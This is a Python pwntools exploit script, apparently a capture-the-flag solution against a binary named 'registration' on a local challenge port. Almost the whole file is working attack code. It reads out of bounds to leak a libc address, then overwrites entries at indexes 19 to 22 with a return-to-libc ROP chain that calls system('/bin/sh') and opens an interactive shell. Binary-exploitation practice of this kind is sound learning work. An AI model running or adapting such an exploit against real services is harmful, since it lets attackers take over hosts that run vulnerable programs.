#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host LOCALHOST --port 1337 ../hosted/registration
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../hosted/registration')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'LOCALHOST'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF('../../call_centre/solve/libc.so.6')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'20')
io.sendlineafter(b': ', b'')

io.sendlineafter(b'> ', b'2')
io.recvuntil(b'\n19: ')
leak = unpack(io.recvuntil(b'\n', drop=True), 'all')
libc.address = leak - libc.libc_start_main_return

io.success('libc: ' + hex(libc.address))

rop = ROP(libc)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'20')
io.sendafter(b': ', p64(rop.find_gadget(['pop rdi', 'ret']).address)[:-1])

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'21')
io.sendafter(b': ', p64(next(libc.search(b'/bin/sh')))[:-1])

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'22')
io.sendafter(b': ', p64(libc.sym['system'])[:-1])

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'19')
io.sendafter(b': ', p64(rop.find_gadget(['ret']).address)[:-1])

io.sendlineafter(b'> ', b'3')

io.interactive()

